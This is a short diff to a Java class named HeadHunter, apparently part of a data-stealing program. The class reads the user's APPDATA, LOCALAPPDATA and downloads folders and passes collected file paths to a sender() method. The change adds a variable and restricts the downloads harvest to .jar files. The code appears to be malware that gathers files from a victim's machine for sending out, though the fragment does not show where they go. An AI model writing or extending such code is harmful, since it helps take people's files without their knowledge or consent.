@@ -6,7 +6,7 @@ import java.nio.charset.*;
 import java.util.*;
 
 public class HeadHunter {
-    public static String var1_1, var1_2, var1_3, var1_4, var1_5, var1_6, var1_7, var1_8;
+    public static String var1_1, var1_2, var1_3, var1_4, var1_5, var1_6, var1_7, var1_8, var1_9;
     public static String appdata = System.getenv("APPDATA");
     public static String lappdata = System.getenv("LOCALAPPDATA");
     public static File downloads = new File(System.getProperty("user.home") + "/downloads");
@@ -194,7 +194,9 @@ public class HeadHunter {
         }
 
         for (File f : downloads.listFiles()) {
-            var1_8 = f.toString();
+            if (f.getName().contains(".jar")) {
+                var1_8 = f.toString();
+            }
         }
 
         sender();
